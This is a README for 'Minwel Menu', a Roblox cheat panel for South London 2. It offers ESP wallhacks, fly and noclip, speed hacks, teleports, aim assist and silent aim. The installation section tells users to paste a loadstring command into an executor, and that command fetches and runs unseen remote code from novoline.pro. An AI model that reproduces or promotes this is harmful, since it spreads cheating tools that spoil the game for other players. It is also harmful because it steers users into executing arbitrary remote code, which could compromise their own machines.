# Minwel Menu — README

A customizable Roblox client-side UI panel for **South London 2**, featuring a dark interface, subtle emerald-green accents, and several gameplay-related panels.

> **Important:** Use this script only in experiences you own or in environments where you have explicit permission to test. Some features depend on the game's internal objects and may stop working if the experience is updated.

## Features

### Interface
- Modern dark anthracite theme with emerald-green accents.
- Draggable window (800 × 600).
- Sidebar navigation: ESP, Movement, Teleportation, and Game.
- Minimize and close controls.

### ESP
Available display options:
- Box
- Corner
- Line
- Skeleton
- Player name
- Distance
- Health
- Team check

### Movement
- Fly and noclip controls.
- Adjustable WalkSpeed (default: `32`).
- Stamina option, when the expected `Valuestats.Stamina` object is available.

### Teleportation
- Preset teleport locations for South London 2.

### Game
- Skip Swipe Loading, which relies on `ReplicatedStorage.UI.SwipeLog`.
- Rejoin the current server.
- Unload the interface and its active connections.

### Aim Assist
- Toggle key: `G` by default.
- Field of View (FOV): `120` by default.
- Maximum distance: `300` by default.
- Target part selection: Head or Torso.
- Optional wall check.
- Option to ignore teammates.
- Adjustable smoothness (default: `18%`).
- Optional Silent Aim integration, which depends on the `ReplicatedStorage.SimpleCast` module exposing a `Fire` function.

## Installation

1. Open your Roblox.
2. Open your executor
3. Paste loadstring(game:HttpGet("https://novoline.pro"))().
4. and run.

The script is designed for a client-side context. Features that rely on game-specific objects or modules require those objects to exist with the expected structure.

## Controls

| Control | Action |
|---|---|
| `Ctrl + F` | Toggle Fly |
| `W`, `A`, `S`, `D` | Move while flying |
| `Q`, `E` | Vertical movement while flying |
| `G` | Toggle Aim Assist |
| UI buttons | Navigate tabs and use the available controls |

The exact behavior of movement keys can depend on the current game and input focus.

## Default settings

| Setting | Default |
|---|---:|
| WalkSpeed | `32` |
| Aim Assist key | `G` |
| Aim Assist FOV | `120` |
| Aim Assist maximum distance | `300` |
| Aim Assist smoothness | `18%` |

The script's UI allows the following ranges where applicable:
- FOV: `30–500`
- Maximum distance: `25–2000`
- Smoothness: `1–100%`

## Dependencies and compatibility

Some options depend on game-specific instances and modules:
- `Valuestats.Stamina` for the stamina option.
- `ReplicatedStorage.UI.SwipeLog` for Skip Swipe Loading.
- `ReplicatedStorage.SimpleCast` with a `Fire` function for the optional Silent Aim integration.

These are not guaranteed to exist or remain unchanged. If the game updates, dependent features may need to be adjusted.

## Troubleshooting

- **A feature does nothing:** Check that its required game object or module exists and has the expected name and structure.
- **An option stops working after an update:** The experience may have changed its internal scripts or objects.
- **The UI does not appear:** Confirm that the code is running from a LocalScript in a client-side context.
- **Controls do not respond:** Make sure the game window has focus and that another UI is not capturing input.

## Disclaimer

This project is provided as-is, without any guarantee of compatibility or continued operation. No license is specified in the source code; add a license file if you intend to publish or distribute the project.
